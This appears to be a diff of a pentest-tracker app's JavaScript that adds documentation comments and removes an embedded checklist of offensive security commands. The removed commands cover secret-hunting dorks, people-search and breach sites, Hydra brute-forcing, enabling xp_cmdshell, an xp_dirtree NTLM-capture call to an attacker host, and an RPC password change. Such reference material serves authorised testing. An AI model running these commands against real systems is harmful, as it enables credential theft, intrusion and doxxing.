@@ -1,332 +1,75 @@
+/* ═══════════════════════════════════════════════════════════════════════════════
+   app.js — Security Tracker Application Logic
+   ═══════════════════════════════════════════════════════════════════════════════
+   Single-file vanilla JS application powering the Security Tracker SPA.
+
+   Architecture overview:
+   ─────────────────────
+   • State:        Singleton `state` object hydrated from localStorage on load.
+   • Persistence:  localStorage (JSON state) + IndexedDB (binary evidence files).
+   • Routing:      Hash-based (#/, #/timeline, #/machine/{id}).
+   • Rendering:    Template-literal HTML → innerHTML injection (no virtual DOM).
+   • Event wiring: Each render pass is followed by a `wire*()` call that attaches
+                   event listeners to the fresh DOM nodes.
+
+   File sections (in order):
+   ─────────────────────────
+   1. Constants & Default State
+   2. Legacy Data Detection & State Hydration
+   3. Phase Catalog & Ordering Helpers
+   4. Configuration Objects, DOM Refs & Mutable State
+   5. Core Utilities (persist, uid)
+   6. IndexedDB Evidence CRUD
+   7. Evidence Preview Overlay
+   8. Storage Request & Image Filtering
+   9. Shared UI Helpers (reusable across modals)
+  10. Storage Metrics (app + browser quota display)
+  11. Routing Helpers
+  12. Date / Time Formatters
+  13. Byte Formatting & Storage Meters
+  14. Checklist Port Filtering & Applicability
+  15. Checklist / Finding Lookups
+  16. UI Feedback Helpers
+  17. Progress Calculators
+  18. Activity Logger
+  19. Data Accessors (machine, credentials, findings, activity, evidence count)
+  20. Navigation
+  21. Renderers (Dashboard, Timeline, Checklist, Credentials, Findings, Notes,
+                 Credential Inline Panel, Mind Map, Machine Detail)
+  22. Router / Mount
+  23. Modal Display (showDialogSafely)
+  24. Event Wiring (wireDashboard, wireMachineDetail, wireChecklist,
+                    wireMachineCredentials, wireFindings)
+  25. Mind Map Interactivity (fullscreen, pan/zoom, SVG connectors, drag)
+  26. Modal Functions (Finding View/Edit, Findings List, Notes, Evidence Gallery,
+                       All Credentials, Quick Finding, Credential Edit)
+  27. Global Event Listeners & Initial Mount
+   ═══════════════════════════════════════════════════════════════════════════════ */
+
+
+/* ───────────────────────────────────────────────
+   1. Constants & Default State
+   ─────────────────────────────────────────────── */
+
+/** localStorage key for the serialized application state */
 const STORAGE_KEY = 'securitytracker-template-v3';
+
+/** IndexedDB database name for binary evidence file storage */
 const EVIDENCE_DB_NAME = 'securitytracker-evidence-db';
+
+/** IndexedDB schema version — bump when changing the object store structure */
 const EVIDENCE_DB_VERSION = 1;
+
+/** Name of the single object store inside the evidence database */
 const EVIDENCE_STORE_NAME = 'evidence_files';
 
-const checklistPhases = [
-  {
-    id: 'osint',
-    name: 'OSINT',
-    optional: true,
-    items: [
-      { id: 'osint-1', name: 'Google Dorking', description: 'Use Google search operators to find exposed files, admin panels, and directory listings.', commands: [
-        { desc: 'Target Scoping', cmd: 'site:example.com\nsite:*.example.com\n-site:example.com\nsite:example.com OR site:example.net' },
-        { desc: 'Logical Operators', cmd: 'example1 AND example2\nexample1 OR example2\nexample1 | example2\nexample1 && example2\n(example1 OR example2) AND example3' },
-        { desc: 'Wildcards & Fuzzing', cmd: 'example*test\nexample * test\nadmin*login\npassword*reset' },
-        { desc: 'Exact Matching / Ordering', cmd: '"example1 example2"\n"example1 example2 example3"' },
-        { desc: 'File Type Discovery', cmd: 'filetype:pdf\nfiletype:doc\nfiletype:docx\nfiletype:xls\nfiletype:xlsx\nfiletype:csv\nfiletype:txt\nfiletype:log\nfiletype:conf\nfiletype:cfg\nfiletype:ini\nfiletype:sql\nfiletype:bak\nfiletype:old\nfiletype:zip\nfiletype:rar\nfiletype:7z\nfiletype:tar\nfiletype:gz\nfiletype:json\nfiletype:xml\nfiletype:yml\nfiletype:yaml\nsite:example.com filetype:sql' },
-        { desc: 'URL-Based Discovery', cmd: 'inurl:admin\ninurl:login\ninurl:signin\ninurl:signup\ninurl:register\ninurl:upload\ninurl:download\ninurl:backup\ninurl:test\ninurl:dev\ninurl:staging\ninurl:old\ninurl:api\ninurl:v1\ninurl:v2\ninurl:php?id=\ninurl:cmd=\ninurl:exec=\ninurl:query=' },
-        { desc: 'Page Content Discovery', cmd: 'intext:password\nintext:username\nintext:credentials\nintext:apikey\nintext:"api key"\nintext:"secret key"\nintext:"access token"\nintext:"confidential"\nintext:"internal use only"' },
-        { desc: 'Title-Based Discovery', cmd: 'intitle:admin\nintitle:login\nintitle:dashboard\nintitle:index.of\nintitle:"index of"\nintitle:"parent directory"' },
-        { desc: 'Directory Listings / Misconfigurations', cmd: 'intitle:"index of" "backup"\nintitle:"index of" ".git"\nintitle:"index of" ".env"\nintitle:"index of" ".ssh"' },
-        { desc: 'Technology Fingerprinting', cmd: 'inurl:wp-admin\ninurl:wp-content\ninurl:wp-includes\ninurl:phpmyadmin\nintitle:phpMyAdmin\ninurl:jira\ninurl:confluence\ninurl:jenkins' },
-        { desc: 'Credentials & Secrets Leakage', cmd: 'filetype:env "DB_PASSWORD"\nfiletype:env "AWS_SECRET"\nfiletype:env "API_KEY"\nfiletype:json "access_token"\nfiletype:yaml "password:"\nintext:"BEGIN RSA PRIVATE KEY"\nintext:"BEGIN OPENSSH PRIVATE KEY"' },
-        { desc: 'Cloud & DevOps Artifacts', cmd: 'filetype:tf\nfiletype:tfvars\nfiletype:dockerfile\nfiletype:docker-compose\nfiletype:helm\nfiletype:kubeconfig' },
-        { desc: 'Error & Debug Exposure', cmd: 'intext:"stack trace"\nintext:"exception"\nintext:"fatal error"\nintext:"debug=true"' },
-        { desc: 'User-Generated Content / Leaks', cmd: 'site:pastebin.com example.com\nsite:github.com example.com\nsite:gitlab.com example.com\nsite:bitbucket.org example.com\nsite:stackoverflow.com "example.com"' },
-        { desc: 'Authentication & Access Control', cmd: 'inurl:reset\ninurl:forgot\ninurl:password\nintitle:"two-factor"\nintitle:"2fa"' },
-        { desc: 'Historical / Cached Data', cmd: 'cache:example.com\nsite:web.archive.org example.com' },
-        { desc: 'Removals / Noise Reduction', cmd: '-site:facebook.com\n-site:twitter.com\n-site:linkedin.com\n-example -test -sample' },
-        { desc: 'High-Value Combined Patterns', cmd: 'site:example.com (filetype:env OR filetype:conf)\n(inurl:admin OR inurl:login) site:example.com\nintitle:"index of" (backup OR db OR sql)' },
-      ] },
-      { id: 'osint-2', name: 'WHOIS Lookup', description: 'Identify registration and ownership details for a domain or IP address.', commands: [
-        { desc: 'Basic Domain Registration', cmd: 'whois target.com' },
-        { desc: 'Subdomain (may fall back to parent domain)', cmd: 'whois sub.target.com' },
-        { desc: 'IP Address Registration', cmd: 'whois 10.10.10.5\nwhois 8.8.8.8' },
-        { desc: 'CIDR / Netblock Ownership', cmd: 'whois 10.10.10.0/24' },
-        { desc: 'TLD-Specific WHOIS (bypasses generic resolvers)', cmd: 'whois -h whois.verisign-grs.com target.com\nwhois -h whois.iana.org target.com' },
-        { desc: 'Registrar-Specific WHOIS', cmd: 'whois -h whois.godaddy.com target.com\nwhois -h whois.namecheap.com target.com' },
-        { desc: 'Nameserver Enumeration', cmd: 'whois target.com | grep -i "name server"\nwhois target.com | grep -i "nserver"' },
-        { desc: 'Registrar / Organization / Abuse Contacts', cmd: 'whois target.com | grep -i "registrar"\nwhois target.com | grep -i "org"\nwhois target.com | grep -i "abuse"' },
-        { desc: 'Dates (Attack Surface Timing)', cmd: 'whois target.com | grep -i "creation"\nwhois target.com | grep -i "updated"\nwhois target.com | grep -i "expiry"' },
-        { desc: 'Reverse WHOIS (email / org reuse indicators)', cmd: 'whois target.com | grep -Ei "email|e-mail|mail"' },
-        { desc: 'ASN Discovery (pivot to infrastructure scope)', cmd: 'whois 10.10.10.5 | grep -i "origin"\nwhois 10.10.10.5 | grep -i "asn"' },
-        { desc: 'RIR-Specific Queries', cmd: 'whois -h whois.arin.net 10.10.10.5\nwhois -h whois.ripe.net 10.10.10.5\nwhois -h whois.apnic.net 10.10.10.5\nwhois -h whois.lacnic.net 10.10.10.5\nwhois -h whois.afrinic.net 10.10.10.5' },
-        { desc: 'Organization Netblocks (scope expansion candidate)', cmd: 'whois 10.10.10.5 | grep -i "netrange"\nwhois 10.10.10.5 | grep -i "cidr"' },
-        { desc: 'Privacy / Proxy Detection', cmd: 'whois target.com | grep -Ei "privacy|proxy|redacted"' },
-        { desc: 'Email Infrastructure Clues', cmd: 'whois target.com | grep -Ei "mx|mail"' },
-      ] },
-      { id: 'osint-3', name: 'DNS Enumeration', description: 'Enumerate DNS records to map infrastructure and find weak points.', commands: [
-        { desc: 'DNS Banner Grabbing', cmd: 'dig @<TARGET_IP> version.bind CHAOS TXT\nnmap -sV -p 53 --script=dns-nsid -Pn <TARGET_IP>' },
-        { desc: 'DNS Enumeration', cmd: 'whois <DOMAIN_OR_IP>\nhost <HOSTNAME> <DNS_SERVER>\nhost -l <DOMAIN> <DNS_SERVER>\ndig @<DNS_SERVER> -x <IP_ADDRESS>\ndig @<DNS_SERVER> <DOMAIN> <RECORD_TYPE>\ndig @ns1.<DOMAIN> <DOMAIN> <RECORD_TYPE>' },
-        { desc: 'TLS CN → DNS Zone Transfer Check', subdesc: 'Nmap shows TLS cert with commonName=mysite.test. DNS service is running — test for misconfigured AXFR.', cmd: 'host -T -l <DOMAIN.LOCAL> <TARGET_IP>' },
-        { desc: 'Post-Zone-Transfer: HTTP Host Enumeration', cmd: 'gobuster dns -r <TARGET_IP> -d <DOMAIN.LOCAL> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185' },
-        { desc: 'DNS Zone Transfer Attacks', cmd: 'dig @<DOMAIN_IP> <DOMAIN> AXFR\ndnsrecon -d <DOMAIN> -a' },
-        { desc: 'DNS Configuration Files (Linux)', cmd: '/etc/host.conf\n/etc/resolv.conf\n/etc/named.conf\n/etc/bind/named.conf\n/etc/bind/named.conf.local' },
-      ] },
-      { id: 'osint-4', name: 'Subdomain Enumeration', description: 'Discover subdomains using passive and active enumeration methods.', commands: [
-        { desc: 'Passive Subdomain Discovery (Primary)', cmd: 'subfinder -d target.com -silent -o subdomains.txt\nsubfinder -d target.com -all -recursive -json -o subfinder.json' },
-        { desc: 'Multi-Source Subdomain Enumeration', cmd: 'amass enum -passive -d target.com -o amass_passive.txt\namass enum -passive -d target.com -src -d target.com -o amass_sources.txt' },
-        { desc: 'Active Subdomain Enumeration (Escalation)', subdesc: 'Use only when allowed by scope.', cmd: 'amass enum -active -d target.com -o amass_active.txt\namass enum -brute -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o amass_bruteforce.txt' },
-      ] },
-      { id: 'osint-5', name: 'Email Harvesting', description: 'Collect email addresses linked to the target domain from all available public sources.', commands: [
-        { desc: 'Harvest emails and names from all available public sources', cmd: 'theHarvester -d target.com -b all' },
-      ] },
-      { id: 'osint-6', name: 'Shodan / Censys Recon', description: 'Find exposed services, open ports, and banners indexed by Shodan.', commands: [
-        { desc: 'Search for all services associated with the target domain', cmd: 'shodan search hostname:target.com' },
-        { desc: 'Inspect all exposed services and banners on a specific IP', cmd: 'shodan host <TARGET_IP>' },
-      ] },
-      { id: 'osint-7', name: 'Social Media / LinkedIn Recon', description: 'Manually gather employee names, job titles, technology stack clues, and org structure from LinkedIn, Twitter, and company pages.' },
-      { id: 'osint-8', name: 'GitHub / Paste Sites', description: 'Search GitHub, GitLab, Pastebin, and similar sites for leaked source code, API keys, credentials, or internal references tied to the target.' },
-      { id: 'osint-9', name: 'Automated Scripts', description: 'End-to-end OSINT automation scripts that chain multiple tools together.', commands: [
-        { desc: 'Basic OSINT Recon Script', subdesc: 'Usage: ./recon.sh target.com — Runs WHOIS, subfinder, assetfinder, httprobe, and gowitness in sequence. Creates organized output directories. Comment out any sections you may not require.', cmd: '#!/bin/bash\n\n# Use the first argument as the domain name\ndomain=$1\n# Define colors\nRED="\\033[1;31m"\nRESET="\\033[0m"\n\n# Define directories\nbase_dir="$domain"\ninfo_path="$base_dir/info"\nsubdomain_path="$base_dir/subdomains"\nscreenshot_path="$base_dir/screenshots"\n\n# Create directories if they don\'t exist\nfor path in "$info_path" "$subdomain_path" "$screenshot_path"; do\n    if [ ! -d "$path" ]; then\n        mkdir -p "$path"\n        echo "Created directory: $path"\n    fi\ndone\n\necho -e "${RED} [+] Checking who it is ... ${RESET}"\nwhois "$domain" > "$info_path/whois.txt"\n\necho -e "${RED} [+] Launching subfinder ... ${RESET}"\nsubfinder -d "$domain" > "$subdomain_path/found.txt"\n\necho -e "${RED} [+] Running assetfinder ... ${RESET}"\nassetfinder "$domain" | grep "$domain" >> "$subdomain_path/found.txt"\n\necho -e "${RED} [+] Checking what\\\'s alive ... ${RESET}"\ncat "$subdomain_path/found.txt" | grep "$domain" | sort -u | httprobe -prefer-https | grep https | sed \'s/https\\?:\\/\\///\' | tee -a "$subdomain_path/alive.txt"\n\necho -e "${RED} [+] Taking screenshots ... ${RESET}"\ngowitness file -f "$subdomain_path/alive.txt" -P "$screenshot_path/" --no-http' },
-      ] },
-      { id: 'osint-10', name: 'OSINT Reconnaissance: People', description: 'Search for people, phone numbers, and voter registration records using public lookup services.', commands: [
-        { desc: 'People Search Engines', cmd: 'https://www.whitepages.com/\nhttps://www.truepeoplesearch.com/\nhttps://www.fastpeoplesearch.com/\nhttps://www.fastbackgroundcheck.com/\nhttps://webmii.com/\nhttps://peekyou.com/\nhttps://www.411.com/\nhttps://www.spokeo.com/\nhttps://thatsthem.com/' },
-        { desc: 'Voter Registration Records', cmd: 'https://voterrecords.com/' },
-        { desc: 'Phone Number Lookup', cmd: 'https://www.truecaller.com/\nhttps://calleridtest.com/\nhttps://infobel.com/' },
-      ] },
-      { id: 'osint-11', name: 'OSINT Reconnaissance: Email', description: 'Discover, verify, and harvest email addresses tied to a target domain.', commands: [
-        { desc: 'Email Discovery & Harvesting', cmd: 'https://hunter.io/\nhttps://phonebook.cz/\nhttps://www.voilanorbert.com/' },
-        { desc: 'Email Verification', cmd: 'https://tools.verifyemailaddress.io/\nhttps://email-checker.net/validate' },
-        { desc: 'Harvest emails from all public sources', cmd: 'theHarvester -d target.com -b all' },
-      ] },
-      { id: 'osint-12', name: 'OSINT Reconnaissance: Usernames & Passwords', description: 'Check for credential leaks, enumerate usernames across platforms, and identify reused accounts.', commands: [
-        { desc: 'Password Breach Databases', cmd: 'https://haveibeenpwned.com/\nhttps://weleakinfo.to/v2/\nhttps://leakcheck.io/\nhttps://snusbase.com/\nhttps://scylla.sh/' },
-        { desc: 'Username Enumeration (Online)', cmd: 'https://namechk.com/\nhttps://whatsmyname.app/\nhttps://namecheckup.com/' },
-        { desc: 'Username Enumeration (Sherlock)', subdesc: 'Sherlock searches 400+ social networks for matching usernames.', cmd: 'sherlock <USERNAME>\nsherlock <USERNAME> --output results.txt\nsherlock <USERNAME> --print-found\nsherlock <USER1> <USER2> <USER3>' },
-      ] },
-      { id: 'osint-13', name: 'OSINT Reconnaissance: Social Media', description: 'Gather intelligence from social media platforms including Twitter, Instagram, Snapchat, and TikTok.', commands: [
-        { desc: 'Twitter / X', cmd: 'https://twitter.com/search-advanced\nhttps://github.com/rmdir-rp/OSINT-twitter-tools' },
-        { desc: 'Instagram', cmd: 'https://imginn.com/' },
-        { desc: 'Snapchat', cmd: 'https://map.snapchat.com/' },
-      ] },
-      { id: 'osint-14', name: 'OSINT Reconnaissance: Images', description: 'Reverse image search and EXIF metadata extraction for location and device intelligence.', commands: [
-        { desc: 'Reverse Image Search', subdesc: 'Most useful for identifying locations from background context like buildings, signs, and landmarks.', cmd: 'https://images.google.com/\nhttps://tineye.com/\nhttps://yandex.com/images/' },
-        { desc: 'EXIF Metadata Extraction', subdesc: 'Social media platforms strip EXIF data on upload, but direct file transfers and some websites preserve it.', cmd: 'exiftool <IMAGE_FILE>\nexiftool -gps* <IMAGE_FILE>\nhttps://jimpl.com/' },
-      ] },
-      { id: 'osint-15', name: 'OSINT Reconnaissance: Websites', description: 'Fingerprint web technologies, analyze DNS records, scan for threats, and monitor website changes.', commands: [
-        { desc: 'Technology Fingerprinting & DNS', cmd: 'https://builtwith.com/\nhttps://centralops.net/co/\nhttps://dnslytics.com/reverse-ip\nhttps://spyonweb.com/\nhttps://viewdns.info/' },
-        { desc: 'Threat Intelligence & Scanning', cmd: 'https://www.virustotal.com/\nhttps://urlscan.io/\nhttps://web-check.as93.net/' },
-        { desc: 'DNS & Certificate Transparency', cmd: 'https://dnsdumpster.com/\nhttps://crt.sh/' },
-        { desc: 'Infrastructure Discovery', cmd: 'https://shodan.io/\nshodan search hostname:target.com\nshodan host <TARGET_IP>' },
-        { desc: 'Website Monitoring & Historical Data', cmd: 'https://visualping.io/\nhttp://backlinkwatch.com/index.php\nhttps://web.archive.org/' },
-      ] },
-      { id: 'osint-16', name: 'OSINT Reconnaissance: Business', description: 'Investigate corporate registrations, organizational structure, and business intelligence.', commands: [
-        { desc: 'Corporate Registry & Business Intelligence', cmd: 'https://opencorporates.com/\nhttps://www.aihitdata.com/' },
-      ] },
-    ],
-  },
-  {
-    id: 'recon',
-    name: 'Enumeration',
-    optional: false,
-    items: [
-      { id: 'recon-2', name: 'TCP Port Scan (Full)', description: 'Full TCP port coverage with OS detection and aggressive scan settings.', commands: [
-        { desc: 'Full TCP scan with OS and version detection at high speed', cmd: 'nmap -p- -O -sC -sV -A --min-rate 5000 <TARGET_IP>' },
-      ]},
-      { id: 'recon-3', name: 'UDP Port Scan', description: 'Scan the most common UDP services for exposure.', commands: [
-        { desc: 'Scan top 100 UDP ports', cmd: 'nmap -sU --top-ports 100 <TARGET_IP>' },
-      ]},
-      { id: 'recon-4', name: 'FTP Enumeration (21)', description: 'Check for anonymous access, grab files, and bruteforce credentials.', commands: [
-        { desc: 'Attempt anonymous FTP login (use "passive" if 229 error)', cmd: 'ftp anonymous@<TARGET_IP>' },
-        { desc: 'Grab all files from an anonymous share', cmd: 'binary\nPROMPT OFF\nmget *' },
-        { desc: 'Bruteforce FTP credentials with Hydra', subdesc: '-s <port-num> specify non-default port | -f exit after first valid login | -u try each username with all passwords before moving on', cmd: 'hydra -v -L users.txt -P /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<TARGET_IP> -t 4' },
-      ]},
-      { id: 'recon-5', name: 'SSH Enumeration (22)', description: 'Audit SSH config, grab banners, and bruteforce credentials.', commands: [
-        { desc: 'Audit SSH server configuration and supported ciphers', cmd: 'ssh-audit <TARGET_IP>' },
-        { desc: 'Grab SSH banner using legacy key exchange', cmd: 'ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <TARGET_IP>' },
-        { desc: 'Bruteforce SSH credentials with Hydra', subdesc: '-f exit after first valid login | -u try each username with all passwords before moving on', cmd: 'hydra -L users.txt -P passwords.txt -t 6 -vV ssh://<TARGET_IP>' },
-      ]},
-      { id: 'recon-6', name: 'SMTP Enumeration (25/465/587)', description: 'Enumerate mail users, verify addresses manually, and send phishing test emails.', commands: [
-        { desc: 'Enumerate SMTP users with nmap script', cmd: 'nmap -p 25 --script=smtp-enum-users <TARGET_IP>' },
-        { desc: 'Manually verify an email address via VRFY', cmd: 'nc -nv <TARGET_IP> 25\nVRFY <username>' },
-        { desc: 'Send a phishing test email with attachment (SWAKS)', cmd: 'swaks --to receiver@mail.com --from sender@mail.com --auth LOGIN --auth-user sender@mail.com --header-X-Test "Header" --server <TARGET_IP> --attach file.txt' },
-      ]},
-      { id: 'recon-7', name: 'DNS Enumeration (53)', description: 'Banner grabbing, DNS enumeration, zone transfer testing, and subdomain discovery.', commands: [
-        { desc: 'Banner grabbing and DNS version info', cmd: 'dig @<TARGET_IP> version.bind CHAOS TXT\nnmap -sV --script dns-nsid -p53 -Pn <TARGET_IP>' },
-        { desc: 'DNS record enumeration (whois, host, dig)', cmd: 'whois <DOMAIN>\nhost <DOMAIN> <TARGET_IP>\nhost -l <DOMAIN> <TARGET_IP>\ndig @<TARGET_IP> -x <TARGET_IP>\ndig @<TARGET_IP> <DOMAIN> ANY' },
-        { desc: 'Zone transfer test', cmd: 'host -T -l <DOMAIN> <TARGET_IP>\ndig @<TARGET_IP> <DOMAIN> AXFR\ndnsrecon -d <DOMAIN> -a' },
-        { desc: 'Subdomain enumeration (gobuster and ffuf)', cmd: 'gobuster dns -r <TARGET_IP> -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100\nffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185' },
-      ]},
-      { id: 'recon-8', name: 'HTTP Enumeration (80/443)', description: 'Web server fingerprinting, header inspection, technology enumeration, and default credential checks. Also manually review page source, robots.txt, sitemap.xml, and any login/upload portals.', commands: [
-        { desc: 'Fingerprint web server with nmap http-enum', cmd: 'nmap -p 80 -sV --script=http-enum <TARGET_IP>' },
-        { desc: 'Grab HTTP headers and follow redirects', cmd: 'curl -IL http://<TARGET_IP>' },
-        { desc: 'Technology fingerprinting with WhatWeb', cmd: 'whatweb -a 3 http://<TARGET_IP>\nwhatweb --no-errors <TARGET_SUBNET>/24' },
-      ]},
-      { id: 'recon-9', name: 'Directory Busting (HTTP)', description: 'Directory and file fuzzing on the web server.', commands: [
-        { desc: 'Fuzz directories and files with gobuster', cmd: 'gobuster dir -u http://<TARGET_IP> -w <WORDLIST>' },
-      ]},
-      { id: 'recon-10', name: 'Nikto Scan (HTTP)', description: 'Web misconfiguration and vulnerability scan.', commands: [
-        { desc: 'Run a full Nikto scan and save output', cmd: 'nikto -h http://<TARGET_IP> -o nikto_output.txt' },
-      ]},
-      { id: 'recon-11', name: 'SMB Enumeration (139/445)', description: 'Anonymous access, null sessions, share enumeration, SMB login with password/hash, and bruteforce.', commands: [
-        { desc: 'Anonymous and null session login attempts', cmd: 'smbclient -L //<TARGET_IP> -U anonymous\nsmbclient -N -L //<TARGET_IP>\nsmbclient -N //<TARGET_IP>/<SHARE>' },
-        { desc: 'CrackMapExec enumeration (users, password policy, shares)', cmd: 'crackmapexec smb <TARGET_IP> -u "" -p "" --users --rid-brute\ncrackmapexec smb <TARGET_IP> -u "" -p "" --pass-pol\ncrackmapexec smb <TARGET_IP> -u "" -p "" --shares\ncrackmapexec smb <TARGET_IP> -u "" -p "" --spider <SHARE> --regex .' },
-        { desc: 'Enum4Linux and nmap SMB scripts', cmd: 'enum4linux -a <TARGET_IP>\nnmap -v -p 139,445 --script smb-os-discovery <TARGET_IP>\nnmap --script smb-vuln* -p 139,445 <TARGET_IP>' },
-        { desc: 'Authenticated SMB login (password and NTLM hash)', subdesc: 'Inside smbclient: RECURSE ON / PROMPT OFF / mget *', cmd: 'smbclient //<TARGET_IP>/SYSVOL -U <USER>\nsmbclient -p 445 //<TARGET_IP>/<SHARE> -U <USER> --password=<PASS>\nsmbclient -L //<TARGET_IP> -U <DOMAIN>/<USER> --pw-nt-hash <HASH>' },
-        { desc: 'Bruteforce SMB credentials with Hydra', cmd: 'hydra -L users.txt -P passwords.txt -t 1 -vV smb://<TARGET_IP>' },
-      ]},
-      { id: 'recon-12', name: 'SNMP Enumeration (161)', description: 'Scan for SNMP, bruteforce community strings, and enumerate Windows users/processes/software via MIB OIDs.', commands: [
-        { desc: 'Scan subnet for open SNMP ports', cmd: 'nmap -sU --open -p 161 <TARGET_SUBNET> -oG open-snmp.txt' },
-        { desc: 'Bruteforce SNMP community strings', cmd: 'onesixtyone -c <COMMUNITY-STRINGS-LIST> -i <IP-RANGES>' },
-        { desc: 'SNMP walk with public community string', cmd: 'snmpwalk -c public -v1 -t 10 <TARGET_IP>' },
-        { desc: 'Enumerate Windows users, processes, software, and open ports via MIB OIDs', subdesc: 'Windows Users → .77.1.2.25 | Running Processes → .25.4.2.1.2 | Installed Software → .25.6.3.1.2 | TCP Listening Ports → .6.13.1.3', cmd: 'snmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.4.1.77.1.2.25\nsnmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2\nsnmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2\nsnmpwalk -c public -v1 <TARGET_IP> 1.3.6.1.2.1.6.13.1.3' },
-      ]},
-      { id: 'recon-13', name: 'LDAP / Global Catalog Enumeration (389/636/3268/3269)', description: 'Anonymous and authenticated LDAP enumeration, record extraction, and domain component queries.', commands: [
-        { desc: 'Anonymous LDAP enumeration with auto-derived base DN', cmd: 'target_domain=\'domain.tld\'\ntarget_hostname="DC01.${target_domain}"\ndomain_component=$(echo $target_domain | tr \'.\' \'\\n\' | xargs -I % echo "DC=%" | paste -sd, -)\nldapsearch -x -H ldap://$target_hostname -b $domain_component' },
-        { desc: 'Alternative anonymous LDAP queries', cmd: 'ldapsearch -x -h <TARGET_IP> -s base namingcontexts\nldapsearch -x -h <TARGET_IP> -s sub -b \'DC=domain,DC=tld\'' },
-        { desc: 'Authenticated LDAP search and full object dump', cmd: 'ldapsearch -x -H ldap://<TARGET_IP> -D \'<DOMAIN>\\<USER>\' -w \'<PASS>\' -b \'DC=domain,DC=tld\' sAMAccountName\nldapsearch -x -H ldap://<TARGET_IP> -b $domain_component \'objectClass=*\'' },
-      ]},
-      { id: 'recon-14', name: 'MSSQL Enumeration (1433)', description: 'MSSQL nmap scripts, impacket client, database queries, xp_cmdshell RCE, and xp_dirtree NTLM capture.', commands: [
-        { desc: 'MSSQL enumeration using nmap scripts', cmd: 'nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET_IP>' },
-        { desc: 'Connect with impacket MSSQL client', cmd: 'impacket-mssqlclient Administrator:Pass@<TARGET_IP> -windows-auth\nimpacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP>' },
-        { desc: 'Basic database queries', cmd: 'select @@version;\nSELECT name from sys.databases;\nUSE <database-name>;\nSELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;\nSELECT * FROM <database>.dbo.<table>;' },
-        { desc: 'Enable and use xp_cmdshell for OS command execution', cmd: 'enable_xp_cmdshell\nEXEC sp_configure \'show advanced options\', 1;\nRECONFIGURE;\nEXEC sp_configure \'xp_cmdshell\', 1;\nRECONFIGURE;\nEXEC xp_cmdshell "whoami"' },
-        { desc: 'Force NTLM authentication capture with xp_dirtree', cmd: 'EXEC xp_dirtree \'\\\\<LHOST>\\share\'' },
-      ]},
-      { id: 'recon-15', name: 'MySQL Enumeration (3306)', description: 'MySQL login, version check, database listing, and data extraction.', commands: [
-        { desc: 'Login to MySQL server', cmd: 'mysql -u <username> -p <password> -h <TARGET_IP> -P 3306 --skip-ssl-verify-server-cert' },
-        { desc: 'Check version, current user, list databases, and query tables', cmd: 'select version();\nselect system_user();\nshow databases;\nuse <database-name>;\nselect * from <table> \\G' },
-      ]},
-      { id: 'recon-16', name: 'RDP Enumeration (3389)', description: 'RDP encryption enumeration and vulnerability checks (MS12-020).', commands: [
-        { desc: 'Enumerate RDP encryption, vulnerabilities, and NTLM info', cmd: 'nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <TARGET_IP>' },
-      ]},
-      { id: 'recon-17', name: 'WinRM Check (5985/5986)', description: 'Validate WinRM access with known credentials.', commands: [
-        { desc: 'Connect to WinRM with evil-winrm', cmd: 'evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>' },
-      ]},
-      { id: 'recon-18', name: 'Finger Enumeration (79)', description: 'Enumerate users via Finger protocol using manual queries and automated scripts.', commands: [
-        { desc: 'Basic user enumeration via Finger', cmd: 'finger @<TARGET_IP>\nfinger admin@<TARGET_IP>' },
-        { desc: 'Automated user enumeration with finger-user-enum.pl', cmd: 'finger-user-enum.pl -U users.txt -t <TARGET_IP>\nfinger-user-enum.pl -u root -t <TARGET_IP>' },
-        { desc: 'Enumerate against a full wordlist and filter results', cmd: 'perl finger-user-enum.pl -t <TARGET_IP> -U /usr/share/wordlists/seclists/Usernames/Names/names.txt | grep -win "Login"' },
-      ]},
-      { id: 'recon-19', name: 'Kerberos Enumeration (88)', description: 'Enumerate Kerberos users with nmap and kerbrute, and extract SPNs with credentials.', commands: [
-        { desc: 'Enumerate Kerberos users with nmap krb5-enum-users', cmd: 'nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=\'domain.local\',userdb="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" <TARGET_IP>' },
-        { desc: 'Enumerate Kerberos users with Kerbrute', cmd: './kerbrute userenum --dc <TARGET_IP> -d <DOMAIN> /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt' },
-        { desc: 'Extract SPNs (requires valid credentials)', cmd: 'GetUserSPNs.py -request -dc-ip <TARGET_IP> <DOMAIN>/<USER>' },
-      ]},
-      { id: 'recon-20', name: 'MSRPC Enumeration (135)', description: 'MSRPC null auth, domain user/group enumeration, and RPC command reference.', commands: [
-        { desc: 'MSRPC enumeration with nmap and rpcclient null/empty auth', cmd: 'nmap -A -sV -sC -Pn --script=msrpc-enum <TARGET_IP> -p135\nrpcclient <TARGET_IP> -N\nrpcclient -U "%" <TARGET_IP>' },
-        { desc: 'Enumerate domain users and groups inside rpcclient', cmd: 'enumdomusers\nquerydispinfo\nqueryuser <RID>\nenumprinters\nenumdomgroups\nquerygroup <RID>\nquerygroupmem <RID>' },
-        { desc: 'Change a user\'s password via RPC', cmd: 'setuserinfo2 <username> 23 <password>' },
-      ]},
